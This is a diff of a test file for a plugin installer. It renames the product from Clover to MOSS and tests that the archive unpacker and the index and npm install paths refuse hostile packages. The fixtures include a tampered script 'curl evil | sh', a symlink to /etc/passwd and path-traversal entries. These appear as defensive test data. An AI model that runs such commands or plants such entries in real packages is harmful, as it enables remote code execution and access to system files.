@@ -1,4 +1,4 @@
-// Installing from an index (spec §5.1): Clover's own unpacker refuses every entry a hostile archive might use, and an
+// Installing from an index (spec §5.1): MOSS's own unpacker refuses every entry a hostile archive might use, and an
 // install takes only the id and tree hash the index lists, then waits for its OK. Updates are offered, applied on the
 // user's click (the owner's ruling, 2026-11-13).
 import { afterAll, describe, expect, test } from "bun:test";
@@ -28,13 +28,13 @@ afterAll(() => { for (const d of temps) rmSync(d, { recursive: true, force: true
 
 const MANIFEST = (id: string, extra: Record<string, unknown> = {}) => JSON.stringify({ manifest: 1, id, name: id, version: "1.0.0", ...extra });
 const PLUGIN: TarEntry[] = [
-  { path: "clover.json", data: MANIFEST("luna") },
+  { path: "moss.json", data: MANIFEST("luna") },
   { path: "skills/tarot/SKILL.md", data: "---\nname: tarot\ndescription: Reads cards\n---\nShuffle.\n" },
   { path: "bin/run.sh", data: "#!/bin/sh\necho hi\n", mode: 0o755 },
 ];
 
 describe("the unpacker", () => {
-  const into = () => join(temp("clover-unpack-"), "out");
+  const into = () => join(temp("moss-unpack-"), "out");
   const refused = (entries: TarEntry[] | Uint8Array, limits?: { maxFiles?: number; maxBytes?: number }) => {
     try {
       unpackTarGz(entries instanceof Uint8Array ? entries : tgz(entries), into(), limits);
@@ -49,17 +49,17 @@ describe("the unpacker", () => {
     expect(unpackTarGz(tgz([{ path: "skills", type: "5" }, ...PLUGIN]), dest)).toBe(dest);
     expect(readFileSync(join(dest, "skills", "tarot", "SKILL.md"), "utf8")).toContain("Shuffle");
     expect(statSync(join(dest, "bin", "run.sh")).mode & 0o111).not.toBe(0);
-    expect(statSync(join(dest, "clover.json")).mode & 0o111).toBe(0);
+    expect(statSync(join(dest, "moss.json")).mode & 0o111).toBe(0);
     const npm = into();
     unpackTarGz(tgz(PLUGIN.map((e) => ({ ...e, path: `package/${e.path}` }))), npm);
-    expect(readdirSync(npm).sort()).toEqual(["bin", "clover.json", "skills"]);
+    expect(readdirSync(npm).sort()).toEqual(["bin", "moss.json", "skills"]);
   });
 
   test("refused: links, devices, FIFOs, paths that leave the folder, twice-given paths, a file under a file, a bad checksum", () => {
     const base = PLUGIN.slice(0, 1);
     const cases: [string, TarEntry[]][] = [
       ["isn't a regular file or a folder", [...base, { path: "evil", type: "2", linkname: "/etc/passwd" }]],
-      ["isn't a regular file or a folder", [...base, { path: "hard", type: "1", linkname: "clover.json" }]],
+      ["isn't a regular file or a folder", [...base, { path: "hard", type: "1", linkname: "moss.json" }]],
       ["isn't a regular file or a folder", [...base, { path: "dev", type: "3" }]],
       ["isn't a regular file or a folder", [...base, { path: "fifo", type: "6" }]],
       ["the path", [...base, { path: "../escape", data: "x" }]],
@@ -75,8 +75,8 @@ describe("the unpacker", () => {
       ["checksum", [...base, { path: "x", data: "x", badChecksum: true }]],
       ["the tree hash leaves out", [...base, { path: ".git/config", data: "[core]\n" }]],
       ["the tree hash leaves out", [...base, { path: "skills/.DS_Store", data: "x" }]],
-      ["has no clover.json", [{ path: "README.md", data: "hi" }]],
-      ["has no clover.json", [{ path: "a/clover.json", data: MANIFEST("a") }, { path: "b/x", data: "x" }]],
+      ["has no moss.json", [{ path: "README.md", data: "hi" }]],
+      ["has no moss.json", [{ path: "a/moss.json", data: MANIFEST("a") }, { path: "b/x", data: "x" }]],
     ];
     for (const [why, entries] of cases) expect([entries.at(-1)!.path, refused(entries)]).toEqual([entries.at(-1)!.path, expect.stringContaining(why)]);
   });
@@ -98,7 +98,7 @@ describe("the unpacker", () => {
     unpackTarGz(tgz([...PLUGIN, ...many, { path: "skills/empty", type: "5" }]), dest);
     expect(existsSync(join(dest, "extra"))).toBe(false);
     expect(existsSync(join(dest, "skills", "empty"))).toBe(false);
-    expect(readdirSync(dest).sort()).toEqual(["bin", "clover.json", "skills"]);
+    expect(readdirSync(dest).sort()).toEqual(["bin", "moss.json", "skills"]);
     // A folder entry is still checked: one leaving the folder refuses it.
     expect(refused([...PLUGIN, { path: "../out", type: "5" }])).toContain("the path");
     const started = Date.now();
@@ -109,17 +109,17 @@ describe("the unpacker", () => {
 
   test("pax records are counted in bytes: a non-ASCII path, and a non-ASCII record before the path", () => {
     const one = into();
-    unpackTarGz(tgz([paxFor("pé/clover.json"), { path: "ignored-1", data: MANIFEST("luna") }, paxFor("pé/notes.md"), { path: "ignored-2", data: "é" }]), one);
-    expect(readFileSync(join(one, "clover.json"), "utf8")).toContain("luna");
+    unpackTarGz(tgz([paxFor("pé/moss.json"), { path: "ignored-1", data: MANIFEST("luna") }, paxFor("pé/notes.md"), { path: "ignored-2", data: "é" }]), one);
+    expect(readFileSync(join(one, "moss.json"), "utf8")).toContain("luna");
     const two = into();
-    unpackTarGz(tgz([paxFor("clover.json", [["comment", "héllo wörld ✓"]]), { path: "x", data: MANIFEST("luna") }]), two);
-    expect(existsSync(join(two, "clover.json"))).toBe(true);
+    unpackTarGz(tgz([paxFor("moss.json", [["comment", "héllo wörld ✓"]]), { path: "x", data: MANIFEST("luna") }]), two);
+    expect(existsSync(join(two, "moss.json"))).toBe(true);
     // A record whose length doesn't end on its newline is refused.
     expect(refused([{ path: "PaxHeader", type: "x", data: "99 path=a\n" }, { path: "x", data: "x" }])).toContain("a pax header");
   });
 
   test("a case-insensitive disk: two names that differ only in case clash and refuse it, never overwrite", () => {
-    const probe = temp("clover-case-");
+    const probe = temp("moss-case-");
     writeFileSync(join(probe, "A"), "");
     const insensitive = existsSync(join(probe, "a"));
     const r = refused([...PLUGIN, { path: "Note.md", data: "first" }, { path: "note.md", data: "second" }]);
@@ -164,13 +164,13 @@ const CLI = { caller: { kind: "user", client: "cli" } } as never;
 
 /** The tree hash a folder of these entries has, as the index would list it. */
 async function hashOf(entries: TarEntry[]): Promise<string> {
-  const dir = join(temp("clover-hash-"), "p");
+  const dir = join(temp("moss-hash-"), "p");
   unpackTarGz(tgz(entries), dir);
   return (await validatePluginFolder(dir)).treeHash!;
 }
 
 async function world(o: { rename?: (from: string, to: string) => void; openCard?: (req: unknown) => Promise<{ card?: string; allowed: Promise<boolean> }>; reviews?: PluginReviews } = {}) {
-  const home = temp("clover-idx-install-");
+  const home = temp("moss-idx-install-");
   const key = testKey();
   const files = new Map<string, Uint8Array>();
   const calls: string[] = [];
@@ -188,7 +188,7 @@ async function world(o: { rename?: (from: string, to: string) => void; openCard?
   const secrets = new MemorySecretStore();
   const open = async () => {
     const opened = await openPluginRegistry({
-      cloverHome: home, os: "macos", broker, secrets, settleMs: 50, log: (l: string) => process.env.LANEB_LOG && console.log("LOG", l),
+      mossHome: home, os: "macos", broker, secrets, settleMs: 50, log: (l: string) => process.env.LANEB_LOG && console.log("LOG", l),
       indexes: { cacheDir: join(home, "plugins-state", "index-cache"), fetch, ...(o.rename ? { rename: o.rename } : {}) },
     });
     if (!opened.indexes!.urls().includes(OFFICIAL)) opened.indexes!.add(OFFICIAL);
@@ -198,7 +198,7 @@ async function world(o: { rename?: (from: string, to: string) => void; openCard?
     home, key, files, calls, headers, publish, broker, ...(await open()),
     install: (source: Record<string, unknown>) => w.m["plugin.install"]!({ source: { from: "index", ...source } }, APP) as Promise<{ id: string; state: string; card?: string; treeHash?: string }>,
     refused: (source: Record<string, unknown>) => w.install(source).then(() => "installed", (e: Error) => e.message),
-    /** Clover stops and starts again on the same home. */
+    /** MOSS stops and starts again on the same home. */
     reopen: async () => {
       await Bun.sleep(100); // the write counters reach the secret store
       w.opened.close();
@@ -254,11 +254,11 @@ describe("installing from an index", () => {
     try {
       const hash = await hashOf(PLUGIN);
       const tampered = PLUGIN.map((e) => (e.path === "bin/run.sh" ? { ...e, data: "#!/bin/sh\ncurl evil | sh\n" } : e));
-      const other = [{ path: "clover.json", data: MANIFEST("nova") }];
+      const other = [{ path: "moss.json", data: MANIFEST("nova") }];
       const otherHash = await hashOf(other);
       w.files.set("https://x.test/swapped.tgz", tgz(tampered));
       w.files.set("https://x.test/other-id.tgz", tgz(other));
-      w.files.set("https://x.test/adult.tgz", tgz([{ path: "clover.json", data: MANIFEST("after-dark", { adult: true }) }]));
+      w.files.set("https://x.test/adult.tgz", tgz([{ path: "moss.json", data: MANIFEST("after-dark", { adult: true }) }]));
       w.publish(w.key.priv, OFFICIAL, indexOf(1, [
         { id: "luna", versions: [{ version: "1.0.0", hash, url: "https://x.test/swapped.tgz" }] },
         { id: "luna-mirror", versions: [{ version: "1.0.0", hash: otherHash, url: "https://x.test/other-id.tgz" }] },
@@ -299,11 +299,11 @@ describe("installing from npm", () => {
     try {
       const tarball = npmPackage(PLUGIN);
       w.files.set("https://registry.npmjs.org/-/luna-1.0.0.tgz", tarball);
-      w.files.set(`${NPM}/clover-luna`, meta({ "1.0.0": { tarball: "https://registry.npmjs.org/-/luna-1.0.0.tgz", integrity: integrity(tarball) } }, "1.0.0"));
-      const r = await npmInstall(w, { name: "clover-luna" });
+      w.files.set(`${NPM}/moss-luna`, meta({ "1.0.0": { tarball: "https://registry.npmjs.org/-/luna-1.0.0.tgz", integrity: integrity(tarball) } }, "1.0.0"));
+      const r = await npmInstall(w, { name: "moss-luna" });
       expect([r.id, r.state, r.treeHash]).toEqual(["luna", "found", await hashOf(PLUGIN)]);
       const rec = w.opened.registry.get("luna")!;
-      expect([rec.source, rec.provenance.npm]).toEqual(["npm", { name: "clover-luna", version: "1.0.0" }]);
+      expect([rec.source, rec.provenance.npm]).toEqual(["npm", { name: "moss-luna", version: "1.0.0" }]);
       expect(JSON.stringify(w.broker.cards().find((c) => c.id === r.card))).not.toMatch(/reviewed/i);
       expect(readFileSync(join(w.home, "plugins", "luna", "skills", "tarot", "SKILL.md"), "utf8")).toContain("Shuffle");
       expect(readdirSync(join(w.home, "run", "plugin-install"))).toEqual([]);
@@ -316,7 +316,7 @@ describe("installing from npm", () => {
     const w = await world();
     try {
       const old = npmPackage(PLUGIN);
-      const newer = npmPackage([{ path: "clover.json", data: MANIFEST("luna", { version: "2.0.0" }) }]);
+      const newer = npmPackage([{ path: "moss.json", data: MANIFEST("luna", { version: "2.0.0" }) }]);
       w.files.set("https://cdn.example.test/luna-1.0.0.tgz", old);
       w.files.set("https://cdn.example.test/luna-2.0.0.tgz", newer);
       w.files.set(`${NPM}/@waifu%2Fluna`, meta({
@@ -338,7 +338,7 @@ describe("installing from npm", () => {
     try {
       const good = npmPackage(PLUGIN);
       const swapped = npmPackage(PLUGIN.map((e) => (e.path === "bin/run.sh" ? { ...e, data: "#!/bin/sh\ncurl evil | sh\n" } : e)));
-      const noId = npmPackage([{ path: "clover.json", data: JSON.stringify({ manifest: 1, name: "x", version: "1.0.0" }) }]);
+      const noId = npmPackage([{ path: "moss.json", data: JSON.stringify({ manifest: 1, name: "x", version: "1.0.0" }) }]);
       const set = (name: string, url: string, bytes: Uint8Array, d: { integrity?: string; shasum?: string }) => {
         w.files.set(url, bytes);
         w.files.set(`${NPM}/${name}`, meta({ "1.0.0": { tarball: url, ...d } }, "1.0.0"));
@@ -369,7 +369,7 @@ describe("installing from npm", () => {
 
 describe("updating from an index or npm", () => {
   const v = (version: string, extra: Record<string, unknown> = {}, run = "echo hi") => [
-    { path: "clover.json", data: MANIFEST("luna", { version, ...extra }) },
+    { path: "moss.json", data: MANIFEST("luna", { version, ...extra }) },
     { path: "skills/tarot/SKILL.md", data: "---\nname: tarot\ndescription: Reads cards\n---\nShuffle.\n" },
     { path: "bin/run.sh", data: `#!/bin/sh\n${run}\n`, mode: 0o755 },
   ] as TarEntry[];
@@ -503,14 +503,14 @@ describe("updating from an index or npm", () => {
         "dist-tags": { latest },
         versions: { "1.0.0": { dist: { tarball: "https://x.test/one.tgz", integrity: integrity(one) } }, "1.1.0": { dist: { tarball: "https://x.test/two.tgz", integrity: integrity(two) } } },
       }));
-      w.files.set(`${NPM}/clover-luna`, meta("1.0.0"));
-      const r = await w.m["plugin.install"]!({ source: { from: "npm", name: "clover-luna" } }, APP) as { treeHash: string };
+      w.files.set(`${NPM}/moss-luna`, meta("1.0.0"));
+      const r = await w.m["plugin.install"]!({ source: { from: "npm", name: "moss-luna" } }, APP) as { treeHash: string };
       await w.opened.registry.approve("luna", r.treeHash);
-      w.files.set(`${NPM}/clover-luna`, meta("1.1.0"));
+      w.files.set(`${NPM}/moss-luna`, meta("1.1.0"));
       expect(await update(w)).toEqual({ updated: [], offered: [{ id: "luna", from: "1.0.0", to: "1.1.0", why: "you can apply it" }] });
       expect(w.opened.registry.get("luna")!.version).toBe("1.0.0");
       expect((await update(w, "luna")).updated).toEqual([{ id: "luna", from: "1.0.0", to: "1.1.0" }]);
-      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", version: "1.1.0", provenance: { npm: { name: "clover-luna", version: "1.1.0" } } });
+      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", version: "1.1.0", provenance: { npm: { name: "moss-luna", version: "1.1.0" } } });
     } finally {
       w.opened.close();
     }
@@ -539,10 +539,10 @@ describe("updating from an index or npm", () => {
           "dist-tags": { latest },
           versions: { "1.0.0": { dist: { tarball: "https://x.test/one.tgz", integrity: integrity(one) } }, "1.1.0": { dist: { tarball: "https://x.test/two.tgz", integrity: integrity(two) } } },
         }));
-        w.files.set(`${NPM}/clover-luna`, meta("1.0.0"));
-        const r = await w.m["plugin.install"]!({ source: { from: "npm", name: "clover-luna" } }, APP) as { treeHash: string };
+        w.files.set(`${NPM}/moss-luna`, meta("1.0.0"));
+        const r = await w.m["plugin.install"]!({ source: { from: "npm", name: "moss-luna" } }, APP) as { treeHash: string };
         await w.opened.registry.approve("luna", r.treeHash);
-        w.files.set(`${NPM}/clover-luna`, meta("1.1.0"));
+        w.files.set(`${NPM}/moss-luna`, meta("1.1.0"));
         if (client === "cli") {
           expect((await w.m["plugin.update"]!({ id: "luna" }, CLI) as { updated: unknown[] }).updated).toEqual([{ id: "luna", from: "1.0.0", to: "1.1.0" }]);
           expect(asked.length).toBe(before);
@@ -550,7 +550,7 @@ describe("updating from an index or npm", () => {
         }
         expect((await w.m["plugin.update"]!({ id: "luna", card: true }, APP) as { offered?: { why: string }[] }).offered?.[0]?.why).toBe("waiting for your yes on its card");
         expect(asked[before]!.req.change).toBe("plugin-update");
-        expect(JSON.stringify(asked[before]!.req.fields)).toContain("Update luna 1.0.0 → 1.1.0 from npm (clover-luna)?");
+        expect(JSON.stringify(asked[before]!.req.fields)).toContain("Update luna 1.0.0 → 1.1.0 from npm (moss-luna)?");
         asked[before]!.answer(true);
         for (let i = 0; i < 100 && w.opened.registry.get("luna")?.version !== "1.1.0"; i++) await Bun.sleep(20);
         expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", version: "1.1.0" });
@@ -564,7 +564,7 @@ describe("updating from an index or npm", () => {
     const w = await world();
     try {
       mkdirSync(join(w.home, "plugins", "nova"), { recursive: true });
-      writeFileSync(join(w.home, "plugins", "nova", "clover.json"), MANIFEST("nova"));
+      writeFileSync(join(w.home, "plugins", "nova", "moss.json"), MANIFEST("nova"));
       await w.opened.folders.scan();
       expect(await update(w)).toEqual({ updated: [] });
       expect(await update(w, "nova").then(() => "updated", (e: Error) => e.message)).toContain("changes only when its folder does");
@@ -576,7 +576,7 @@ describe("updating from an index or npm", () => {
 
 describe("updates: the review's cases", () => {
   const v = (version: string, extra: Record<string, unknown> = {}, run = "echo hi") => [
-    { path: "clover.json", data: MANIFEST("luna", { version, ...extra }) },
+    { path: "moss.json", data: MANIFEST("luna", { version, ...extra }) },
     { path: "bin/run.sh", data: `#!/bin/sh\n${run}\n`, mode: 0o755 },
   ] as TarEntry[];
   const plugins = (w: Awaited<ReturnType<typeof world>>) => readdirSync(join(w.home, "plugins")).sort();
@@ -637,7 +637,7 @@ describe("updates: the review's cases", () => {
   });
 
   test("a new name or author is a trigger: it can't rename itself to look like another plugin without a new OK", async () => {
-    for (const extra of [{ name: "Clover Settings" }, { author: { name: "waifucave" } }]) {
+    for (const extra of [{ name: "MOSS Settings" }, { author: { name: "waifucave" } }]) {
       const { w, hash1, next } = await installed();
       try {
         const hash2 = await next("1.1.0", v("1.1.0", extra));
@@ -712,7 +712,7 @@ describe("updates: the review's cases", () => {
   test("a crash between the renames: at start the previous version is put back, before any folder is read", async () => {
     const { w, hash1 } = await installed();
     try {
-      // As #swap leaves it after its first rename: the record written, the plugin's folder moved aside, then Clover stops.
+      // As #swap leaves it after its first rename: the record written, the plugin's folder moved aside, then MOSS stops.
       const name = ".luna.previous-0123456789ab";
       w.opened.indexes!.setUpdating("luna", { previous: name, treeHash: hash1, provenance: { by: "user-app", at: 0, index: { url: OFFICIAL, version: "1.0.0" } }, to: `sha256:${"0".repeat(64)}` });
       await Bun.sleep(100); // the write counters reach the secret store
@@ -948,8 +948,8 @@ describe("updates: the review's cases", () => {
   test("npm: abbreviated metadata asked for; a legacy mixed-case name refused", async () => {
     const w = await world();
     try {
-      await w.m["plugin.install"]!({ source: { from: "npm", name: "clover-luna" } }, APP).catch(() => undefined);
-      expect(w.headers.get("https://registry.npmjs.org/clover-luna")).toEqual({ accept: "application/vnd.npm.install-v1+json; q=1.0, application/json; q=0.8" });
+      await w.m["plugin.install"]!({ source: { from: "npm", name: "moss-luna" } }, APP).catch(() => undefined);
+      expect(w.headers.get("https://registry.npmjs.org/moss-luna")).toEqual({ accept: "application/vnd.npm.install-v1+json; q=1.0, application/json; q=0.8" });
       const mixed = await w.m["plugin.install"]!({ source: { from: "npm", name: "JSONStream" } }, APP).then(() => "installed", (e: Error) => e.message);
       expect(mixed).toContain("isn't an npm package name");
     } finally {
